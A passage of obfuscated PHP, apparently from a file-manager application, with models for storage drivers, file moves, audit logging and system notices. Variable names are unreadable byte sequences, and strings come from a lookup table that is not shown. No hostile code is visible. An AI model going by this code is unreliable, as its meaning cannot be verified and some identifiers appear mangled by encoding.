$◊›ÂÆ’È[] = $îƒ∆ò√Œ; } return $◊›ÂÆ’È; } public function defaultDriver() { $¢†˜ﬂÓ› =& $_SERVER[Çâä∆◊¡]; $≤¡Ñé∫á = parent::listData(); $—ÔˆÎ≤˘ = array_filter_by_field($≤¡Ñé∫á, $¢†˜ﬂÓ›[37], 1); $—ÔˆÎ≤˘ = $—ÔˆÎ≤˘[0]; if ($—ÔˆÎ≤˘) { $—ÔˆÎ≤˘[$¢†˜ﬂÓ›[6]] = json_decode($—ÔˆÎ≤˘[$¢†˜ﬂÓ›[6]], !0); } return $—ÔˆÎ≤˘; } public function driverInfo($∏äÙ◊òæ) { $ ˆÓ—≈ÿ =& $_SERVER[Çâä∆◊¡]; $…Ì÷çÇ≠ = array_to_keyvalue(parent::listData(), $ ˆÓ—≈ÿ[401]); if (!isset($…Ì÷çÇ≠[$∏äÙ◊òæ])) { return !1; } $ü˛†ÚÑ‚ = $…Ì÷çÇ≠[$∏äÙ◊òæ]; $ü˛†ÚÑ‚[$ ˆÓ—≈ÿ[6]] = json_decode($ü˛†ÚÑ‚[$ ˆÓ—≈ÿ[6]], !0); return $ü˛†ÚÑ‚; } public function remove($ü∞Æ¡Ï©) { $this->removeShareItems($ü∞Æ¡Ï©); return parent::remove($ü∞Æ¡Ï©); } public function removeWithFile($û§éÉ˙¿, $ˆ∆€ôÒ§) { $†¨ö◊Ÿ∫ =& $_SERVER[Çâä∆◊¡]; $äﬂ ôÚ• = array($†¨ö◊Ÿ∫[810] => $û§éÉ˙¿); $ﬁπÏúæÅ = Model($†¨ö◊Ÿ∫[470])->where($äﬂ ôÚ•)->count(); $‰¢ÿé∫ß = Model($†¨ö◊Ÿ∫[470])->where($äﬂ ôÚ•)->sum($†¨ö◊Ÿ∫[80]); $‚ÊäﬁáÑ = $ˆ∆€ôÒ§ . $†¨ö◊Ÿ∫[2123] . $û§éÉ˙¿; $ÈÆ¢Øäó = new TaskFileTransfer($‚ÊäﬁáÑ, $†¨ö◊Ÿ∫[2119], $ﬁπÏúæÅ, LNG($†¨ö◊Ÿ∫[2124]) . "\50{$û§éÉ˙¿}\51"); $ÈÆ¢Øäó->task[$†¨ö◊Ÿ∫[756]] = (double) $‰¢ÿé∫ß; $‘œôÜ€˝ = KodIO::defaultDriver(); $ò‰•ıÉé = $‘œôÜ€˝[$†¨ö◊Ÿ∫[401]]; $Óﬂ≤÷§ë = "\173\x69\x6f\72{$ò‰•ıÉé}\x7d\57"; $∞πù˜â™ = !0; $•ÉâÑ”¢ = array(); $˜±¯»å¬ = Model($†¨ö◊Ÿ∫[192])->where($äﬂ ôÚ•)->field($†¨ö◊Ÿ∫[2125])->select(); foreach ($˜±¯»å¬ as $Øïæ‹±™) { $›‡Ó‚œù = $Øïæ‹±™[$†¨ö◊Ÿ∫[78]]; $ô˛∏∆¡∆ = $Óﬂ≤÷§ë . str_replace("\x7b\151\x6f\72{$û§éÉ˙¿}\x7d\x2f", $†¨ö◊Ÿ∫[12], $›‡Ó‚œù); if (!IO::exist($›‡Ó‚œù)) { $•ÉâÑ”¢[] = $Øïæ‹±™[$†¨ö◊Ÿ∫[467]]; $ÈÆ¢Øäó->updateFileEnd($Øïæ‹±™[$†¨ö◊Ÿ∫[32]], $Øïæ‹±™[$†¨ö◊Ÿ∫[80]]); continue; } if (IO::exist($ô˛∏∆¡∆)) { $ÈÆ¢Øäó->updateFileEnd($Øïæ‹±™[$†¨ö◊Ÿ∫[32]], $Øïæ‹±™[$†¨ö◊Ÿ∫[80]]); continue; } if (!IO::move($›‡Ó‚œù, get_path_father($ô˛∏∆¡∆))) { $∞πù˜â™ = !1; break; } $äﬂ ôÚ• = array($†¨ö◊Ÿ∫[467] => $Øïæ‹±™[$†¨ö◊Ÿ∫[467]]); $†¨ÚÜ≤¥ = array($†¨ö◊Ÿ∫[810] => $ò‰•ıÉé, $†¨ö◊Ÿ∫[78] => $ô˛∏∆¡∆); Model($†¨ö◊Ÿ∫[192])->where($äﬂ ôÚ•)->save($†¨ÚÜ≤¥); } $this->removeByFileID($•ÉâÑ”¢); if (!$∞πù˜â™) { $ÈÆ¢Øäó->stop($‚ÊäﬁáÑ); return !1; } $ÈÆ¢Øäó->end(); if ($ˆ∆€ôÒ§ == $†¨ö◊Ÿ∫[1779]) { $this->remove($û§éÉ˙¿); } } public function progress($§’¢õ¨“, $˜õá– î) { return Task::get($˜õá– î . $_SERVER[Çâä∆◊¡][2123] . $§’¢õ¨“); } private function removeByFileID($©‡ﬁ¨·â = array()) { $∂ŸÄÍ¸ò =& $_SERVER[Çâä∆◊¡]; if (empty($©‡ﬁ¨·â)) { return; } $Ë¸Ë¢√Ñ = array($∂ŸÄÍ¸ò[467] => array($∂ŸÄÍ¸ò[7], $©‡ﬁ¨·â)); $®öÃñæ” = Model($∂ŸÄÍ¸ò[1312])->where($Ë¸Ë¢√Ñ)->field($∂ŸÄÍ¸ò[403])->select(); if (!$®öÃñæ”) { return; } $®öÃñæ” = array_to_keyvalue($®öÃñæ”, $∂ŸÄÍ¸ò[12], $∂ŸÄÍ¸ò[403]); foreach ($®öÃñæ” as $“≈öõñ∞) { Model($∂ŸÄÍ¸ò[417])->removeNow($“≈öõñ∞, !1); } } private function removeShareItems($ÿ”øÇ€™) { $≥çÁÓöª =& $_SERVER[Çâä∆◊¡]; $•≠Ïà÷„ = "\x7b\151\157\72{$ÿ”øÇ€™}\x7d\57"; $û∏ºˆ˘ÿ = array($≥çÁÓöª[403] => 0, $≥çÁÓöª[1161] => array($≥çÁÓöª[378], "{$•≠Ïà÷„}\45")); $◊‘à∫ºí = Model($≥çÁÓöª[1790])->where($û∏ºˆ˘ÿ)->field($≥çÁÓöª[488])->select(); if (empty($◊‘à∫ºí)) { return; } $ñé∏‚±≈ = array_to_keyvalue($◊‘à∫ºí, $≥çÁÓöª[12], $≥çÁÓöª[488]); Model($≥çÁÓöª[595])->remove($ñé∏‚±≈); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\x65\x6d\x2e\114\x69\x67\150\164\101\160\x70"; public $modelType = "\123\171\163\164\145\155\x4f\x70\x74\151\157\x6e"; public $field = array("\156\141\155\x65", "\x67\162\157\165\160", "\x64\x65\x73\143", "\143\157\x6e\x74\145\x6e\x74"); public function listData($û˜çÃ∂¬ = false, $õ∆Àæö‡ = "\x6d\x6f\x64\151\146\171\x54\151\155\x65", $ØÊ˜ÎÉÜ = true) { return parent::listData($û˜çÃ∂¬, $õ∆Àæö‡, $ØÊ˜ÎÉÜ); } public function remove($ÜØø∫ÂÛ) { $¬πÏ√√Õ = $this->findByName($ÜØø∫ÂÛ); if (!$¬πÏ√√Õ) { return !1; } return parent::remove($¬πÏ√√Õ[$_SERVER[Çâä∆◊¡][401]]); } public function add($∏˜‰’Úë) { if ($this->findByName($∏˜‰’Úë[$_SERVER[Çâä∆◊¡][32]])) { return !1; } return parent::insert($∏˜‰’Úë); } public function update($úÄÕ”ÒÕ, $íÔéù–≈) { $Ôå◊‰ ù =& $_SERVER[Çâä∆◊¡]; $Ùø°ñí¶ = $this->findByName($úÄÕ”ÒÕ); $¯ﬁÜçˆÓ = $this->findByName($íÔéù–≈[$Ôå◊‰ ù[32]]); if (!$Ùø°ñí¶ || $¯ﬁÜçˆÓ && $¯ﬁÜçˆÓ[$Ôå◊‰ ù[401]] != $Ùø°ñí¶[$Ôå◊‰ ù[401]]) { return !1; } return parent::update($Ùø°ñí¶[$Ôå◊‰ ù[401]], $íÔéù–≈); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\171\163\164\x65\x6d\x5f\x6c\x6f\x67"; protected $dataAuto = array(array("\143\162\x65\x61\x74\145\x54\x69\x6d\x65", "\x74\151\x6d\145", "\151\x6e\163\x65\x72\164", "\x66\165\156\143\x74\151\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $çØ¢≤œ‰ =& $_SERVER[Çâä∆◊¡]; return array($çØ¢≤œ‰[2126] => LNG($çØ¢≤œ‰[2127]), $çØ¢≤œ‰[2128] => LNG($çØ¢≤œ‰[2129]), $çØ¢≤œ‰[1753] => LNG($çØ¢≤œ‰[2130]), $çØ¢≤œ‰[2131] => LNG($çØ¢≤œ‰[2132]), $çØ¢≤œ‰[2133] => LNG($çØ¢≤œ‰[2134]), $çØ¢≤œ‰[2135] => LNG($çØ¢≤œ‰[2136]), $çØ¢≤œ‰[2137] => LNG($çØ¢≤œ‰[2138]), $çØ¢≤œ‰[1783] => LNG($çØ¢≤œ‰[2138]), $çØ¢≤œ‰[1784] => LNG($çØ¢≤œ‰[2139]), $çØ¢≤œ‰[2140] => LNG($çØ¢≤œ‰[2141]), $çØ¢≤œ‰[2142] => LNG($çØ¢≤œ‰[2143]), $çØ¢≤œ‰[2144] => LNG($çØ¢≤œ‰[2145]), $çØ¢≤œ‰[2146] => LNG($çØ¢≤œ‰[2147]), $çØ¢≤œ‰[1781] => LNG($çØ¢≤œ‰[2148]), $çØ¢≤œ‰[2149] => LNG($çØ¢≤œ‰[2150]), $çØ¢≤œ‰[1788] => LNG($çØ¢≤œ‰[2151]), $çØ¢≤œ‰[2152] => LNG($çØ¢≤œ‰[2153]), $çØ¢≤œ‰[2154] => LNG($çØ¢≤œ‰[2155]), $çØ¢≤œ‰[2156] => LNG($çØ¢≤œ‰[2157]), $çØ¢≤œ‰[2158] => LNG($çØ¢≤œ‰[2159]), $çØ¢≤œ‰[1791] => LNG($çØ¢≤œ‰[2160]), $çØ¢≤œ‰[1792] => LNG($çØ¢≤œ‰[2161]), $çØ¢≤œ‰[2162] => LNG($çØ¢≤œ‰[2163]), $çØ¢≤œ‰[2164] => LNG($çØ¢≤œ‰[2165]), $çØ¢≤œ‰[2166] => LNG($çØ¢≤œ‰[2167]), $çØ¢≤œ‰[1786] => LNG($çØ¢≤œ‰[2168]), $çØ¢≤œ‰[2169] => LNG($çØ¢≤œ‰[2170]), $çØ¢≤œ‰[1785] => LNG($çØ¢≤œ‰[2171]), $çØ¢≤œ‰[2172] => LNG($çØ¢≤œ‰[2173]), $çØ¢≤œ‰[2174] => LNG($çØ¢≤œ‰[2175]), $çØ¢≤œ‰[2176] => LNG($çØ¢≤œ‰[2177]), $çØ¢≤œ‰[2178] => LNG($çØ¢≤œ‰[2178]), $çØ¢≤œ‰[2179] => LNG($çØ¢≤œ‰[1757]), $çØ¢≤œ‰[2180] => LNG($çØ¢≤œ‰[2181]), $çØ¢≤œ‰[2182] => LNG($çØ¢≤œ‰[2183]), $çØ¢≤œ‰[2184] => LNG($çØ¢≤œ‰[2185]), $çØ¢≤œ‰[2186] => LNG($çØ¢≤œ‰[2187]), $çØ¢≤œ‰[2188] => LNG($çØ¢≤œ‰[2189]), $çØ¢≤œ‰[2190] => LNG($çØ¢≤œ‰[2190]), $çØ¢≤œ‰[2191] => LNG($çØ¢≤œ‰[2192]), $çØ¢≤œ‰[2193] => LNG($çØ¢≤œ‰[2194]), $çØ¢≤œ‰[2195] => LNG($çØ¢≤œ‰[2196]), $çØ¢≤œ‰[2197] => LNG($çØ¢≤œ‰[2198]), $çØ¢≤œ‰[2199] => LNG($çØ¢≤œ‰[2200]), $çØ¢≤œ‰[2201] => LNG($çØ¢≤œ‰[2202])); } private function typeFile() { $óÉÏﬁ«¥ =& $_SERVER[Çâä∆◊¡]; $¯…˜≤±« = array($óÉÏﬁ«¥[1788] => array($óÉÏﬁ«¥[1789]), $óÉÏﬁ«¥[2144] => array($óÉÏﬁ«¥[2203]), $óÉÏﬁ«¥[2146] => array($óÉÏﬁ«¥[2204]), $óÉÏﬁ«¥[1781] => array($óÉÏﬁ«¥[1782]), $óÉÏﬁ«¥[2154] => array(), $óÉÏﬁ«¥[2156] => array(), $óÉÏﬁ«¥[2158] => array(), $óÉÏﬁ«¥[1791] => array($óÉÏﬁ«¥[1793]), $óÉÏﬁ«¥[1792] => array($óÉÏﬁ«¥[1793]), $óÉÏﬁ«¥[2162] => array($óÉÏﬁ«¥[2205]), $óÉÏﬁ«¥[2164] => array($óÉÏﬁ«¥[2205]), $óÉÏﬁ«¥[2166] => array($óÉÏﬁ«¥[2206]), $óÉÏﬁ«¥[2152] => array($óÉÏﬁ«¥[2207]), $óÉÏﬁ«¥[1786] => array($óÉÏﬁ«¥[2208]), $óÉÏﬁ«¥[2169] => array($óÉÏﬁ«¥[2209]), $óÉÏﬁ«¥[1785] => array($óÉÏﬁ«¥[1787])); return $¯…˜≤±«; } private function typeAll() { $“¿Ü◊«Ä =& $_SERVER[Çâä∆◊¡]; $Û˜…¿…Ò = $this->typeList; $ËÓ≈ÿ«√ = array_filter($this->typeFile()); foreach ($ËÓ≈ÿ«√ as $ëëƒœñ => $∏Ì’Ï’õ) { $Û˜…¿…Ò[$∏Ì’Ï’õ[0]] = $Û˜…¿…Ò[$ëëƒœñ]; } $Û˜…¿…Ò[$“¿Ü◊«Ä[1793]] = LNG($“¿Ü◊«Ä[2210]); $Û˜…¿…Ò[$“¿Ü◊«Ä[2205]] = LNG($“¿Ü◊«Ä[2211]); return $Û˜…¿…Ò; } public function addLog($—·«ô≤≥, $»öñöÍ⁄ = array()) { $•à«•çÈ =& $_SERVER[Çâä∆◊¡]; if (!isset($this->typeList[$—·«ô≤≥])) { return; } $‹“ì•ëç = defined($•à«•çÈ[474]) && USER_ID ? USER_ID : (isset($»öñöÍ⁄[$•à«•çÈ[1642]]) ? $»öñöÍ⁄[$•à«•çÈ[1642]] : 0); if (!$‹“ì•ëç) { $‹“ì•ëç = (int) Session::get($•à«•çÈ[1942]); } $í¯µåﬁ¢ = get_client_ip(); if (!$»öñöÍ⁄ || strlen(json_encode($»öñöÍ⁄)) >= 1024) { $»öñöÍ⁄ = array($•à«•çÈ[2212] => $í¯µåﬁ¢); } else { if (is_array($»öñöÍ⁄)) { $»öñöÍ⁄[$•à«•çÈ[2212]] = $í¯µåﬁ¢; } else { $»öñöÍ⁄ = array($•à«•çÈ[1178] => $»öñöÍ⁄, $•à«•çÈ[2212] => $í¯µåﬁ¢); } } $»öñöÍ⁄ = array($•à«•çÈ[1632] => Session::sign(), $•à«•çÈ[1633] => $‹“ì•ëç, $•à«•çÈ[33] => $—·«ô≤≥, $•à«•çÈ[1635] => json_encode($»öñöÍ⁄)); parent::add($»öñöÍ⁄); } public function remove($˚∑⁄∑Û”) { $this->where(array($_SERVER[Çâä∆◊¡][420] => $˚∑⁄∑Û”))->delete(); } private function _makeOrder($Ñ‰∫áÙ† = '') { $î†É‚„¡ =& $_SERVER[Çâä∆◊¡]; $—”Ë∑èä = $î†É‚„¡[193]; $¨°ˆŸ˙û = array($î†É‚„¡[448] => $î†É‚„¡[449], $î†É‚„¡[450] => $î†É‚„¡[451]); $Ê≥œí˘Á = Input::get($î†É‚„¡[456], $î†É‚„¡[7], $î†É‚„¡[1974], array($î†É‚„¡[1900], $î†É‚„¡[450])); $Ê≥œí˘Á = $¨°ˆŸ˙û[$Ê≥œí˘Á]; $Ñ‰∫áÙ† = $Ñ‰∫áÙ† . "{$—”Ë∑èä}\x20{$Ê≥œí˘Á}"; return $this->order($Ñ‰∫áÙ†); } public function get($‰‰´ñ∏æ = '') { $©äÄ‰›ù =& $_SERVER[Çâä∆◊¡]; if (!$‰‰´ñ∏æ) { show_json(array()); } $Òø·Á¯î = array(); if ($‰‰´ñ∏æ[$©äÄ‰›ù[1642]]) { $Òø·Á¯î[$©äÄ‰›ù[1642]] = $‰‰´ñ∏æ[$©äÄ‰›ù[1642]]; } if (isset($‰‰´ñ∏æ[$©äÄ‰›ù[754]])) { $Ø‘ ŸÒ◊ = $‰‰´ñ∏æ[$©äÄ‰›ù[754]]; $§≠è‹ıâ = isset($‰‰´ñ∏æ[$©äÄ‰›ù[496]]) ? $‰‰´ñ∏æ[$©äÄ‰›ù[496]] : time(); $Òø·Á¯î[$©äÄ‰›ù[193]] = array($©äÄ‰›ù[328], array($Ø‘ ŸÒ◊, $§≠è‹ıâ)); } if ($‰‰´ñ∏æ[$©äÄ‰›ù[33]]) { $¥±‘Ô›‡ = explode($©äÄ‰›ù[50], $‰‰´ñ∏æ[$©äÄ‰›ù[33]]); $õÁ‰Âä˙ = $this->typeFile(); $—§ ≠Ù« = array(); foreach ($¥±‘Ô›‡ as $†∞‰∑˙î) { $—§ ≠Ù«[] = $†∞‰∑˙î; if (isset($õÁ‰Âä˙[$†∞‰∑˙î])) { $—§ ≠Ù« = array_merge($—§ ≠Ù«, $õÁ‰Âä˙[$†∞‰∑˙î]); } } $—§ ≠Ù« = array_unique($—§ ≠Ù«); if ($—§ ≠Ù«) { $Òø·Á¯î[$©äÄ‰›ù[33]] = array($©äÄ‰›ù[7], $—§ ≠Ù«); } } else { $Òø·Á¯î[$©äÄ‰›ù[33]] = array($©äÄ‰›ù[2213], $©äÄ‰›ù[2214]); } if (!empty($‰‰´ñ∏æ[$©äÄ‰›ù[2212]])) { $Òø·Á¯î[$©äÄ‰›ù[451]] = array($©äÄ‰›ù[378], "\45{$‰‰´ñ∏æ[$©äÄ‰›ù[2212]]}\45"); } $‰Ïí˜˝„ = $this->_makeOrder()->where($Òø·Á¯î)->selectPage(); if (empty($‰Ïí˜˝„[$©äÄ‰›ù[364]])) { show_json(array(), !0, $‰Ïí˜˝„[$©äÄ‰›ù[361]]); } $‰Ïí˜˝„[$©äÄ‰›ù[364]] = $this->logList($‰Ïí˜˝„[$©äÄ‰›ù[364]]); return $‰Ïí˜˝„; } private function ipAddress(&$Á∑…î≤∆) { $…¡ïÍÙ÷ =& $_SERVER[Çâä∆◊¡]; if (!empty($Á∑…î≤∆[$…¡ïÍÙ÷[2212]])) { $Æ∞åÚ˜Ó = IpLocation::get($Á∑…î≤∆[$…¡ïÍÙ÷[2212]]); } else { $Æ∞åÚ˜Ó = LNG($…¡ïÍÙ÷[2215]); } $Á∑…î≤∆[$…¡ïÍÙ÷[2216]] = $Æ∞åÚ˜Ó; } private function descZipDownload($ÎÀ∫”ãù, &$Îå€äƒå) { $ë“ΩæÜñ =& $_SERVER[Çâä∆◊¡]; if (!isset($ÎÀ∫”ãù[$ë“ΩæÜñ[2217]])) { return; } $áøûˆ¸Ÿ = json_decode($ÎÀ∫”ãù[$ë“ΩæÜñ[2217]], !0); foreach ($áøûˆ¸Ÿ as $∫Úëµ–) { try { $èûöà∑ã = IO::infoFull($∫Úëµ–[$ë“ΩæÜñ[78]]); } catch (Exception $Î€Îù£á) { continue; } $ÎÀ∫”ãù[$ë“ΩæÜñ[78]] = $∫Úëµ–[$ë“ΩæÜñ[78]]; $Îå€äƒå[] = $ÎÀ∫”ãù[$ë“ΩæÜñ[403]] = $èûöà∑ã[$ë“ΩæÜñ[403]]; $Îå€äƒå[] = $ÎÀ∫”ãù[$ë“ΩæÜñ[2028]] = $èûöà∑ã[$ë“ΩæÜñ[498]]; break; } return $ÎÀ∫”ãù; } private function getSourceList(&$î¡å∆äÃ) { $ßÓ•î◊Ú =& $_SERVER[Çâä∆◊¡]; $ƒòÊ≤˙Ÿ = array(); foreach ($î¡å∆äÃ as $Ï˝›´º => $òŸµ⁄òç) { $¸°∫®˙ˆ = json_decode($òŸµ⁄òç[$ßÓ•î◊Ú[451]], !0); if ($òŸµ⁄òç[$ßÓ•î◊Ú[33]] == $ßÓ•î◊Ú[1784]) { $¸°∫®˙ˆ = $this->descZipDownload($¸°∫®˙ˆ, $ƒòÊ≤˙Ÿ); $î¡å∆äÃ[$Ï˝›´º][$ßÓ•î◊Ú[451]] = json_encode($¸°∫®˙ˆ); continue; } if (strpos($òŸµ⁄òç[$ßÓ•î◊Ú[33]], $ßÓ•î◊Ú[2030]) !== 0) { if (!isset($¸°∫®˙ˆ[$ßÓ•î◊Ú[78]]) || strpos($òŸµ⁄òç[$ßÓ•î◊Ú[33]], $ßÓ•î◊Ú[2218]) !== 0) { continue; } try { $îÁ†±ä¯ = IO::infoFull($¸°∫®˙ˆ[$ßÓ•î◊Ú[78]]); } catch (Exception $ˆµíñ∂Ä) { continue; } $ƒòÊ≤˙Ÿ[] = $¸°∫®˙ˆ[$ßÓ•î◊Ú[403]] = $îÁ†±ä¯[$ßÓ•î◊Ú[403]]; $ƒòÊ≤˙Ÿ[] = $¸°∫®˙ˆ[$ßÓ•î◊Ú[2028]] = $îÁ†±ä¯[$ßÓ•î◊Ú[498]]; $î¡å∆äÃ[$Ï˝›´º][$ßÓ•î◊Ú[451]] = json_encode($¸°∫®˙ˆ); continue; } $ƒòÊ≤˙Ÿ[] = $¸°∫®˙ˆ[$ßÓ•î◊Ú[403]]; $ƒòÊ≤˙Ÿ[] = $¸°∫®˙ˆ[$ßÓ•î◊Ú[2028]]; if ($¸°∫®˙ˆ[$ßÓ•î◊Ú[33]] == $ßÓ•î◊Ú[551]) { $ƒòÊ≤˙Ÿ[] = $¸°∫®˙ˆ[$ßÓ•î◊Ú[451]][$ßÓ•î◊Ú[1145]]; $ƒòÊ≤˙Ÿ[] = $¸°∫®˙ˆ[$ßÓ•î◊Ú[451]][$ßÓ•î◊Ú[1146]]; } if ($¸°∫®˙ˆ[$ßÓ•î◊Ú[33]] == $ßÓ•î◊Ú[2037]) { $ƒòÊ≤˙Ÿ[] = $¸°∫®˙ˆ[$ßÓ•î◊Ú[451]][$ßÓ•î◊Ú[403]]; } } if (!$ƒòÊ≤˙Ÿ) { return array(); } return Model($ßÓ•î◊Ú[818])->sourceListInfo($ƒòÊ≤˙Ÿ, !0); } private function logList($‚¬€∂ ™) { $ŒÎ’Î•Ã =& $_SERVER[Çâä∆◊¡]; $†Ü¨˙Ï˘ = array_to_keyvalue($‚¬€∂ ™, $ŒÎ’Î•Ã[12], $ŒÎ’Î•Ã[1642]); $øçã∞º£ = Model($ŒÎ’Î•Ã[538])->userListInfo(array_unique($†Ü¨˙Ï˘)); $ô˙ç°∑ = $this->getSourceList($‚¬€∂ ™); $¸˝ú€Ú¡ = $this->typeAll(); $∞ø∑ŸŸØ = array(); $÷§˚∑íﬁ = array(); foreach ($‚¬€∂ ™ as $·€ﬂ∂ÃÙ => $≤Ã≤≥™¶) { $ Áº‡ñ´ = $≤Ã≤≥™¶[$ŒÎ’Î•Ã[33]]; $Ÿï£„ ˚ = isset($øçã∞º£[$≤Ã≤≥™¶[$ŒÎ’Î•Ã[1642]]]) ? $øçã∞º£[$≤Ã≤≥™¶[$ŒÎ’Î•Ã[1642]]] : !1; $¬°Ãﬂ≥ = strpos($ Áº‡ñ´, $ŒÎ’Î•Ã[2219]) === 0 ? LNG($ŒÎ’Î•Ã[2220]) : LNG($ŒÎ’Î•Ã[2215]); $≤Ã≤≥™¶[$ŒÎ’Î•Ã[32]] = isset($Ÿï£„ ˚[$ŒÎ’Î•Ã[32]]) ? $Ÿï£„ ˚[$ŒÎ’Î•Ã[32]] : LNG($ŒÎ’Î•Ã[2215]); $≤Ã≤≥™¶[$ŒÎ’Î•Ã[2078]] = isset($Ÿï£„ ˚[$ŒÎ’Î•Ã[2078]]) ? $Ÿï£„ ˚[$ŒÎ’Î•Ã[2078]] : $ŒÎ’Î•Ã[12]; $≤Ã≤≥™¶[$ŒÎ’Î•Ã[1539]] = isset($¸˝ú€Ú¡[$ Áº‡ñ´]) ? $¸˝ú€Ú¡[$ Áº‡ñ´] : $¬°Ãﬂ≥; $≤Ã≤≥™¶[$ŒÎ’Î•Ã[1973]] = $Ÿï£„ ˚; $◊‚á∆£Ö = json_decode($≤Ã≤≥™¶[$ŒÎ’Î•Ã[451]], !0); $≤Ã≤≥™¶[$ŒÎ’Î•Ã[2212]] = isset($◊‚á∆£Ö[$ŒÎ’Î•Ã[2212]]) ? $◊‚á∆£Ö[$ŒÎ’Î•Ã[2212]] : $ŒÎ’Î•Ã[12]; $≤Ã≤≥™¶[$ŒÎ’Î•Ã[2216]] = IpLocation::get($≤Ã≤≥™¶[$ŒÎ’Î•Ã[2212]]); if (strpos($ Áº‡ñ´, $ŒÎ’Î•Ã[2030]) === 0 || isset($◊‚á∆£Ö[$ŒÎ’Î•Ã[2028]])) { $◊‚á∆£Ö[$ŒÎ’Î•Ã[87]] = $ô˙ç°∑[$◊‚á∆£Ö[$ŒÎ’Î•Ã[403]]]; $◊‚á∆£Ö[$ŒÎ’Î•Ã[2042]] = $ô˙ç°∑[$◊‚á∆£Ö[$ŒÎ’Î•Ã[2028]]]; if ($◊‚á∆£Ö[$ŒÎ’Î•Ã[33]] == $ŒÎ’Î•Ã[551]) { $◊‚á∆£Ö[$ŒÎ’Î•Ã[451]][$ŒÎ’Î•Ã[1145]] = $ô˙ç°∑[$◊‚á∆£Ö[$ŒÎ’Î•Ã[451]][$ŒÎ’Î•Ã[1145]]]; $◊‚á∆£Ö[$ŒÎ’Î•Ã[451]][$ŒÎ’Î•Ã[1146]] = $ô˙ç°∑[$◊‚á∆£Ö[$ŒÎ’Î•Ã[451]][$ŒÎ’Î•Ã[1146]]]; } if ($◊‚á∆£Ö[$ŒÎ’Î•Ã[33]] == $ŒÎ’Î•Ã[2037]) { $◊‚á∆£Ö[$ŒÎ’Î•Ã[451]][$ŒÎ’Î•Ã[403]] = $ô˙ç°∑[$◊‚á∆£Ö[$ŒÎ’Î•Ã[451]][$ŒÎ’Î•Ã[403]]]; } if ($◊‚á∆£Ö[$ŒÎ’Î•Ã[33]] == $ŒÎ’Î•Ã[1779]) { $◊‚á∆£Ö[$ŒÎ’Î•Ã[2042]] = $◊‚á∆£Ö[$ŒÎ’Î•Ã[87]]; $◊‚á∆£Ö[$ŒÎ’Î•Ã[2028]] = $◊‚á∆£Ö[$ŒÎ’Î•Ã[2042]][$ŒÎ’Î•Ã[403]]; $◊‚á∆£Ö[$ŒÎ’Î•Ã[87]] = !1; $◊‚á∆£Ö[$ŒÎ’Î•Ã[403]] = $ŒÎ’Î•Ã[12]; } if ($◊‚á∆£Ö[$ŒÎ’Î•Ã[87]] && $◊‚á∆£Ö[$ŒÎ’Î•Ã[87]][$ŒÎ’Î•Ã[412]] == $ŒÎ’Î•Ã[1261]) { $÷§˚∑íﬁ[] = $≤Ã≤≥™¶[$ŒÎ’Î•Ã[401]]; unset($‚¬€∂ ™[$·€ﬂ∂ÃÙ]); continue; } if ($◊‚á∆£Ö[$ŒÎ’Î•Ã[2042]] && $◊‚á∆£Ö[$ŒÎ’Î•Ã[2042]][$ŒÎ’Î•Ã[412]] == $ŒÎ’Î•Ã[1261]) { $÷§˚∑íﬁ[] = $≤Ã≤≥™¶[$ŒÎ’Î•Ã[401]]; unset($‚¬€∂ ™[$·€ﬂ∂ÃÙ]); continue; } } $≤Ã≤≥™¶[$ŒÎ’Î•Ã[451]] = $◊‚á∆£Ö; unset($≤Ã≤≥™¶[$ŒÎ’Î•Ã[2221]]); $∞ø∑ŸŸØ[] = $≤Ã≤≥™¶; } $this->clearSystemPathLog($÷§˚∑íﬁ); return $∞ø∑ŸŸØ; } private function clearSystemPathLog($ŸËÙÜ“å) { $áÚÅ„ëµ =& $_SERVER[Çâä∆◊¡]; if (count($ŸËÙÜ“å) == 0) { return; } $ãÛ–¶‹ˆ = array($áÚÅ„ëµ[401] => array($áÚÅ„ëµ[7], array_unique($ŸËÙÜ“å))); $this->where($ãÛ–¶‹ˆ)->delete(); } public function deviceList($©ÖÔó∏ñ, $ó≥üπŸ• = 0) { $•È·êÔê =& $_SERVER[Çâä∆◊¡]; $æ≥¿·ƒö = array($•È·êÔê[1642] => $©ÖÔó∏ñ, $•È·êÔê[193] => array($•È·êÔê[1001], $ó≥üπŸ•), $•È·êÔê[33] => $•È·êÔê[1753]); $∏’˜õèœ = array(); $√§Ô√À‚ = $this->field($•È·êÔê[2222])->where($æ≥¿·ƒö)->order($•È·êÔê[2040])->limit(50)->select(); foreach ($√§Ô√À‚ as $˙Ëò©’‚ => $«˛µ∫ﬂ) { if ($˙Ëò©’‚ > 0 && abs($«˛µ∫ﬂ[$•È·êÔê[193]] - $√§Ô√À‚[$˙Ëò©’‚ - 1][$•È·êÔê[193]]) < 5) { continue; } $†÷ÿ˙‚ë = json_decode($«˛µ∫ﬂ[$•È·êÔê[451]], !0); $«˛µ∫ﬂ[$•È·êÔê[2212]] = isset($†÷ÿ˙‚ë[$•È·êÔê[2212]]) ? $†÷ÿ˙‚ë[$•È·êÔê[2212]] : $•È·êÔê[12]; unset($†÷ÿ˙‚ë[$•È·êÔê[2212]]); $ÓªïÅ˚Ÿ = $this->deviceType($†÷ÿ˙‚ë[$•È·êÔê[2031]]); if (isset($∏’˜õèœ[$ÓªïÅ˚Ÿ])) { continue; } $«˛µ∫ﬂ[$•È·êÔê[2216]] = IpLocation::get($«˛µ∫ﬂ[$•È·êÔê[2212]]); $«˛µ∫ﬂ[$•È·êÔê[451]] = $†÷ÿ˙‚ë; $∏’˜õèœ[$ÓªïÅ˚Ÿ] = $«˛µ∫ﬂ; } return array_values($∏’˜õèœ); } public function deviceType($¬ö©∆£É) { return $¬ö©∆£É; } } goto b∂õãΩ´¥Ë; b∂õãΩ´¥Ë: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\145\155\x2e\156\157\x74\151\143\145\114\x69\x73\x74"; public $field = array("\x6e\141\x6d\145", "\x63\x6f\156\x74\x65\x6e\x74", "\x61\x75\164\150", "\155\x6f\144\145", "\164\x69\x6d\x65", "\164\x79\x70\x65", "\x6c\x65\x76\145\154", "\x65\x6e\141\x62\x6c\x65", "\163\x6f\x72\164"); public function listData($•áë±”… = false, $∆§ûÏÏ¿ = "\x73\x6f\162\x74", $Ñ€˘ã≤  = false) { return parent::listData($•áë±”…, $∆§ûÏÏ¿, $Ñ€˘ã≤ ); } public function add($Á˘á€ÿœ) { $Éÿøﬂí√ =& 